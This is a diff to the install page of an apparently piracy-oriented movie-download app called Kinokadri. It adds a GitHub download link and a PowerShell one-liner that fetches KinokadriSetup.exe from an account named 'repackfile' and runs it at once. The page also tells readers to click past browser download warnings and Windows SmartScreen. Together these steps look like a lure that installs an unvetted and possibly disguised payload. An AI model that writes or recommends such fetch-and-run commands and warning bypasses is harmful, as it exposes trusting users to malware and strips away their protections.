@@ -16,11 +16,34 @@ Install the app once. After that, any movie takes three actions to download.
 
 ### Step 1. Download and install the app
 
-1. Click the <b>“Download”</b> button. The file <b>KinokadriSetup.exe</b> will be downloaded.
-2. Open the downloaded file with a double click (it is usually in the <b>Downloads</b> folder).
-3. Wait: the app installs and opens by itself. You do not need to choose anything.
+The app is hosted on GitHub. Choose one of two ways — the result is the same.
 
-> The app is new, so Windows may show a blue window saying “Windows protected your PC”. If it does, click <b>More info</b>, then <b>Run anyway</b>. Make sure you downloaded the file with the button on this page and not from another site.
+#### Way 1. Download from GitHub
+
+1. Click the <b>“Download”</b> button. The app page on GitHub opens.
+2. In the lower part of that page find the <b>Assets</b> section and click the file <b>KinokadriSetup.exe</b>. The file is downloaded. You do not need the “Source code” files.
+3. If the browser stops the download and says the file is not commonly downloaded, open the browser's downloads list and choose <b>Keep</b>.
+4. Open the downloaded file with a double click (it is usually in the <b>Downloads</b> folder).
+5. Wait: the app installs and opens by itself. You do not need to choose anything.
+
+👉 **[KinokadriSetup.exe](https://github.com/repackfile/kinokadri-app/releases/latest/download/KinokadriSetup.exe)** · [Releases](https://github.com/repackfile/kinokadri-app/releases/latest)
+
+#### Way 2. Install with PowerShell (one command)
+
+This way Windows downloads the file from the same GitHub page and starts the installation by itself.
+
+1. Right-click the <b>Start</b> button (the Windows sign at the bottom of the screen) and choose <b>Terminal</b> or <b>Windows PowerShell</b>.
+2. Copy the command below with the <b>“Copy”</b> button.
+3. In the window that opened, press the right mouse button (the command is pasted), then press <kbd>Enter</kbd>.
+4. Wait: the file is downloaded (about 50 MB) and the installation starts by itself.
+
+```powershell
+curl.exe -L -o "$env:TEMP\KinokadriSetup.exe" "https://github.com/repackfile/kinokadri-app/releases/latest/download/KinokadriSetup.exe"; if ($?) { Start-Process "$env:TEMP\KinokadriSetup.exe" }
+```
+
+The command does two things: it downloads KinokadriSetup.exe from GitHub to the temporary folder and runs it. Administrator rights are not needed.
+
+> The app is new, so Windows may show a blue window saying “Windows protected your PC”. If it does, click <b>More info</b>, then <b>Run anyway</b>. Make sure you downloaded the file from this GitHub page and not from another site.
 
 > On some computers the installer shows “Installing Microsoft WebView2”. This is a Microsoft component; it is installed once and takes a few minutes. Do not close the window.
 
